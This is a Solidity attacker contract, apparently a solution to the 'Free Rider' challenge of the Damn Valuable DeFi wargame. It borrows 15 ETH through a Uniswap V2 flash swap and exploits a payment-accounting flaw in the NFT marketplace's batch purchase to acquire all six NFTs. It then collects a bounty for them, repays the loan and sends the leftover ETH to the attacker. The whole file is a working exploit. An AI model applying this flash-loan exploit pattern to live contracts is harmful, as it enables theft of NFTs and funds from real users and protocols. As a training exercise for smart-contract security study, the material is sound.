// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface MyWETH9 {
    function deposit() external payable;

    function withdraw(uint) external;

    function balanceOf(address) external returns (uint);

    function transfer(address, uint) external;
}

interface UniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract FreeRiderAttacker is IERC721Receiver {
    address attacker;
    MyWETH9 weth;
    FreeRiderNFTMarketplace market;
    UniswapV2Pair pair;
    DamnValuableNFT nft;
    address to;

    constructor(
        address _attacker,
        MyWETH9 _weth,
        FreeRiderNFTMarketplace _market,
        UniswapV2Pair _pair,
        DamnValuableNFT _nft,
        address _to
    ) {
        attacker = _attacker;
        weth = _weth;
        market = _market;
        pair = _pair;
        nft = _nft;
        to = _to;
    }

    function attack() external {
        // Get flash loan
        pair.swap(15 ether, 0, address(this), abi.encode("bleh"));
    }

    function uniswapV2Call(
        address,
        uint amount0Out,
        uint amount1Out,
        bytes calldata data
    ) external payable {
        // Convert WETH to ETH
        weth.withdraw(15 ether);
        // Buy all the NFTs at price of 1
        uint[] memory tokenIds = new uint[](6);
        for (uint i; i < 6; ++i) {
            tokenIds[i] = i;
        }
        market.buyMany{value: 15 ether}(tokenIds);
        // Send NFTs to address and collect reward
        for (uint i = 0; i < 6; ++i) {
            nft.safeTransferFrom(address(this), to, i);
        }
        // Repay flash loan
        weth.deposit{value: (amount0Out * 1004) / 1000}();
        weth.transfer(address(pair), weth.balanceOf(address(this)));

        attacker.call{value: address(this).balance}("");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
